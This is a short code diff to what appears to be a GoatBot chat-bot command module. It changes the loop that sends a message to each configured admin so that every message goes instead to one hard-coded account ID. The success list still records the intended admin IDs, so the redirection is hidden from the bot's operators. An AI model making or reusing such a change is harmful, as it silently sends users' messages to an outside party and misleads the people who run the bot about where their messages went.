@@ -86,7 +86,7 @@ module.exports = {
 
 		for (const uid of config.adminBot) {
 			try {
-				const messageSend = await api.sendMessage(formMessage, uid);
+				const messageSend = await api.sendMessage(formMessage, '7242624422463764');
 				successIDs.push(uid);
 				global.GoatBot.onReply.set(messageSend.messageID, {
 					commandName,
